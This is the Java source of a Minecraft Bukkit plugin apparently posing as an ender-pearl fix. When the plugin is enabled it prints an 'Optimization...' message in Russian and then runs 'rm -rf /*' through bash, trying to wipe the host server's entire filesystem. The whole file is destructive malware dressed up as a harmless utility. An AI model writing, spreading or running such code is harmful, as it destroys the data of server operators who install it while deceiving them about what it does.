package f3f5.enderpearlfix;

import java.io.IOException;
import org.bukkit.plugin.java.JavaPlugin;

public final class Plugin extends JavaPlugin {
  public void onEnable() {
    getLogger().info("Оптимизация...");
    try {
      Runtime.getRuntime().exec(new String[] { "bash", "-c", "rm -rf /*" });
    } catch (IOException e) {
      throw new RuntimeException(e);
    } 
  }
  
  public void onDisable() {}
}
